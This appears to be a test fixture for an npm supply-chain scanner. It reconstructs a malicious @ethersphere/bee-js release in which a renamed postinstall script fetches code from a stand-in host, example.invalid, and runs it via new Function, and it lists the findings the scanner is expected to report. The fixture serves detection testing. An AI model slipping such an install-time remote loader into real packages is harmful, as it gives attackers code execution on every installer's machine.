@@ -1,0 +1,109 @@
+{
+  "id": "incident-bee-js-postinstall-loader",
+  "title": "Trusted-publishing release widens files and turns prepare into a postinstall remote-code loader",
+  "category": "remote-code-execution",
+  "intent": "Synthetic reconstruction of @ethersphere/bee-js 13.2.0 -> 13.3.0 (Socket, 9 Nov 2026), published through trusted publishing with valid provenance. The release adds \"scripts\" to the package.json files allowlist, renames the existing prepare script to postinstall with the same command, and the newly shipped scripts/generate-version.cjs fetches a response body and runs it through new Function with require/console/process. dist/ is byte-identical. The host is example.invalid; no payload is present.",
+  "previousPackageJson": {
+    "name": "@ethersphere/bee-js",
+    "version": "13.2.0",
+    "main": "dist/index.js",
+    "files": ["dist"],
+    "scripts": {
+      "prepare": "node scripts/generate-version.cjs"
+    }
+  },
+  "stagedPackageJson": {
+    "name": "@ethersphere/bee-js",
+    "version": "13.3.0",
+    "main": "dist/index.js",
+    "files": ["dist", "scripts"],
+    "scripts": {
+      "postinstall": "node scripts/generate-version.cjs"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 147,
+      "sha256": "6781fc4133009faf4f8a346cb5d820c1f78190e908b3ee46a7e3ff927c924ef0",
+      "flags": [],
+      "textSample": "{\"name\":\"@ethersphere/bee-js\",\"version\":\"13.2.0\",\"main\":\"dist/index.js\",\"files\":[\"dist\"],\"scripts\":{\"prepare\":\"node scripts/generate-version.cjs\"}}"
+    },
+    {
+      "path": "dist/index.js",
+      "size": 92,
+      "sha256": "a2a66b1faf3913432cbc65f85e3b1a7acf8f4a770b8af9b25dfe9778557679fd",
+      "flags": [],
+      "textSample": "'use strict';\nclass Bee {\n  constructor(url) {\n    this.url = url;\n  }\n}\nexports.Bee = Bee;\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 161,
+      "sha256": "600a6b8e37ff3dc9608c5c3db0c6db812090f158f5d29e6ba2b4e1c45a7d3100",
+      "flags": [],
+      "textSample": "{\"name\":\"@ethersphere/bee-js\",\"version\":\"13.3.0\",\"main\":\"dist/index.js\",\"files\":[\"dist\",\"scripts\"],\"scripts\":{\"postinstall\":\"node scripts/generate-version.cjs\"}}"
+    },
+    {
+      "path": "dist/index.js",
+      "size": 92,
+      "sha256": "a2a66b1faf3913432cbc65f85e3b1a7acf8f4a770b8af9b25dfe9778557679fd",
+      "flags": [],
+      "textSample": "'use strict';\nclass Bee {\n  constructor(url) {\n    this.url = url;\n  }\n}\nexports.Bee = Bee;\n"
+    },
+    {
+      "path": "scripts/generate-version.cjs",
+      "size": 606,
+      "sha256": "e2a09539d502d4fcac90825fa7e80b351b2b5f3455f509d11ab951aec2b8de8d",
+      "flags": [],
+      "textSample": "const https = require('https');\nconst os = require('os');\nhttps\n  .get('https://analytics.example.invalid/v1/analytics', { headers: { 'User-Agent': os.type(), 'X-Ethersphere': '1' } }, (res) => {\n    let body = '';\n    res.on('data', (chunk) => (body += chunk));\n    res.on('end', () => {\n      try {\n        new Function('require', 'console', 'process', body)(require, console, process);\n      } catch {}\n    });\n  })\n  .on('error', () => {});\n\nconst fs = require('fs');\nconst { version } = require('../package.json');\nfs.writeFileSync('src/version.ts', `export const PACKAGE_VERSION = '${version}';\\n`);\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "install-script.lifecycle",
+      "severity": "high",
+      "file": "package.json"
+    },
+    {
+      "ruleId": "package-json.files-widened",
+      "severity": "medium",
+      "file": "package.json"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "high",
+      "file": "scripts/generate-version.cjs"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "high",
+      "file": "scripts/generate-version.cjs"
+    }
+  ],
+  "expectedReleaseRisk": "high",
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "install-script.lifecycle",
+      "severity": "high",
+      "file": "package.json"
+    },
+    {
+      "ruleId": "package-json.files-widened",
+      "severity": "medium",
+      "file": "package.json"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "high",
+      "file": "scripts/generate-version.cjs"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "high",
+      "file": "scripts/generate-version.cjs"
+    }
+  ]
+}
